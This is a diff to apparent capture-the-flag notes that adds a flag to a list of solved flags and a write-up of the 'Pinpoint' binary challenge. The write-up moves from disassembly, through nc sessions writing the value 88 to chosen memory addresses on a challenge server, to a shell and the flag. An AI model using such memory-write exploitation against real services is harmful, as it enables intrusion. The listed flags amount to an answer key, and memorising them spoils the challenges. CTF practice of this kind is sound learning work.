@@ -1,7 +1,7 @@
 Final flags:
 1- "SSS{the_more_you_look_the_less_you_actually_see}
 2- 
-3-
+3-  SSS{aim_for_the_kill}
 4- SSS{Mirror_mirror_on_the_wall_who_is_the_fairest_of_them_all}
 5- SSS{pr3tty_c0nvoluted_fl4g} 
 6-  SSS{the_talker_has_spoken}
@@ -172,7 +172,7 @@ It has to have the structure : SSS{...}
 
 
 # Binary: Qualifiers: Pinpoint
-
+### SSS{aim_for_the_kill}
 By running strings pinpoint | less -> we discover : 
 Found functions:
 __isoc99_scanf → Takes user input → might ask you for something
@@ -211,6 +211,85 @@ undefined8 main(void)
   return 0;
 }
 ```
+Then we check for :
+```
+DAT_0040084f                                    XREF[1]:     main:00400746(*)
+        0040084f 25              ??         25h    %
+        00400850 68              ??         68h    h
+        00400851 68              ??         68h    h
+        00400852 75              ??         75h    u
+        00400853 00              ??         00h
+%hhu
+si
+DAT_0040083a                                    XREF[1]:     main:00400721(*)
+        0040083a 25              ??         25h    %
+        0040083b 6c              ??         6Ch    l
+        0040083c 75              ??         75h    u
+        0040083d 00              ??         00h
+%lu
+```
+%hhu -> The %hhu format specifier is for unsigned chars
+% lu - long unsigned integer
+
+### v                                               XREF[1]:     main:00400762(R)
+   ###     00601058 53 53 53 53     undefined4 53535353h
+   ### we have to replace 53535353 with 53585353
+   but because it is little endian, we need to get it back
+ ##  58 is in decimal 88
+ ## the value that we needed to write is 88
+ ## where do we need to write it? in  00601058 transformed in decimal plus +2 
+ 
+secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
+address to write to: 6291672
+value to write: 88
+ls
+secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
+address to write to: 6291673
+value to write: 88
+ls
+secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
+address to write to: 6291673
+value to write: 88
+ls
+secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
+address to write to: 6295641
+value to write: 88
+ls
+secarea@D1040H:~/pinpoint$ nc 141.85.224.99 31337
+### address to write to: 6295642
+### value to write: 88
+ls
+bin
+boot
+core
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+cd home
+ls
+ctf
+cat ctf
+cat: ctf: Is a directory
+cd ctf
+ls
+flag
+pinpoint
+cat flag
+SSS{aim_for_the_kill}
 
 # Binary: Qualifiers: Mirror Me
 #### SSS{Mirror_mirror_on_the_wall_who_is_the_fairest_of_them_all}
